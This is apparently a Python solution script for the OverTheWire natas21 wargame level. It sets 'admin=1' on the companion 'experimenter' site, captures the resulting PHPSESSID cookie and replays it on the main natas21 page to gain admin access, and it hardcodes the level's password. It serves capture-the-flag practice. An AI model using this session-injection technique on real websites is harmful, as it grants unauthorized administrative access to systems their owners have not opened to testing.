import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string


natasURL = 'http://natas21.natas.labs.overthewire.org/'
coURL    = 'http://natas21-experimenter.natas.labs.overthewire.org'

natas_usr   = 'natas21'
natas_pword = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'
login=(natas_usr,natas_pword)


# cookie = {"PHPSESSID":"testing"}
r = requests.post(url=coURL , auth=login, data = {'admin':'1','submit':'Update'})

print(r.text)
print(r.cookies)
found_cookie = r.cookies["PHPSESSID"]


cookie = {'PHPSESSID':found_cookie}
print("Found cookie is: " + found_cookie)

print("Try getting other website")
r1 = requests.request(method ='GET', url=natasURL , auth=login, cookies=cookie)

print(r1.text)
print(r1.cookies)
